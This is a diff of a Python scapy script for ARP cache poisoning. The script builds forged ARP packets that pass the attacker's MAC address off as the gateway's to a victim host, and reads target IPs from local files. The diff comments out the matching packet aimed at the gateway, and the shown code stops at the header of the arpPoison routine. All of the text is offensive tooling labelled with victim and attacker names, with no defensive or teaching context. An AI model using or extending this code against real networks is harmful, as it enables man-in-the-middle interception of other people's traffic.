@@ -4,7 +4,6 @@ from scapy.all import *
 file = open("vIP.txt")
 vIP = file.read()
 file.close()
-
 file = open("gatewayIP.txt")
 gatewayIP = file.read()
 file.close()
@@ -37,7 +36,7 @@ macAttacker = subprocess.check_output("cat /sys/class/net/enp0s3/address", shell
 #gatewayIP = subprocess.check_output("route -n | awk '$1 == \"0.0.0.0\" {print $2}' ", shell = True)
 #gatewayMac = subprocess.check_output("arp -n | awk '$1 == " + gatewayIP + "  {print $3}'", shell = True)
 
-gatewayMAC = ip_to_mac(gatewayIP)
+#gatewayMAC = ip_to_mac(gatewayIP)
 
 #Create arp packet for victim
 arpVictim = Ether() / ARP()
@@ -48,12 +47,12 @@ arpVictim[ARP].hwdst = vMAC
 arpVictim[ARP].pdst = vIP
 
 #Create arp packet for Gateway
-arpGateway = Ether() / ARP()
-arpGateway[Ether].src = macAttacker
-arpGateway[ARP].hwsrc = macAttacker
-arpGateway[ARP].psrc = vIP
-arpGateway[ARP].hwdst = gatewayMAC
-arpGateway[ARP].pdst = gatewayIP
+#arpGateway = Ether() / ARP()
+#arpGateway[Ether].src = macAttacker
+#arpGateway[ARP].hwsrc = macAttacker
+#arpGateway[ARP].psrc = vIP
+#arpGateway[ARP].hwdst = gatewayMAC
+#arpGateway[ARP].pdst = gatewayIP
 
 
 def arpPoison():
